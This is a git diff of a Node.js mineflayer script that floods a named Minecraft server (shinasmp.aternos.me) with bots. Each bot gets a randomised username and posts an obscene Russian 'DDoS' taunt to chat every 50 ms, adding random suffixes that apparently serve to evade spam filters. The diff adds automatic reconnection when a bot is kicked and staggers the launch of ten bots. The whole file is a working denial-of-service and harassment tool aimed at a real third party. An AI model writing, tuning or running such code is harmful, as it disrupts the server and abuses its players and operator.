@@ -1,14 +1,15 @@
+process.env.NODE_NO_WARNINGS = '1';
 const mineflayer = require('mineflayer');
 
 function createBot() {
-    const username = `lolddos_${Math.floor(Math.random() * 1000000)}`;
+    const username = `ddosgovna_${Math.random().toString(36).substring(2, 8)}`;
     
     const bot = mineflayer.createBot({
         host: 'shinasmp.aternos.me',
         port: 11048,
         username: username,
         version: '1.21.1',
-        hideErrors: true
+        checkTimeoutInterval: 30000
     });
 
     bot.once('spawn', () => {
@@ -16,20 +17,21 @@ function createBot() {
         
         setTimeout(() => {
             setInterval(() => {
-                bot.chat('распизделись оба, дудос вашей сраки от либари');
-            }, 100); 
+                bot.chat(`чота вы распизделись, ловите дудос жопы от либари ${Math.random().toString(36).substring(2, 5)}`);
+            }, 50); 
         }, 1000);
     });
 
-    bot.on('error', () => {});
-    
-    bot.on('end', () => {
+    const reconnect = () => {
+        bot.removeAllListeners();
         setTimeout(createBot, 1500);
-    });
+    };
 
-    bot.on('kicked', () => {
-        setTimeout(createBot, 1500);
-    });
+    bot.on('error', reconnect);
+    bot.on('kicked', reconnect);
+    bot.on('end', reconnect);
 }
 
-setInterval(createBot, 500);
+for (let i = 0; i < 10; i++) {
+    setTimeout(createBot, i * 1000);
+}
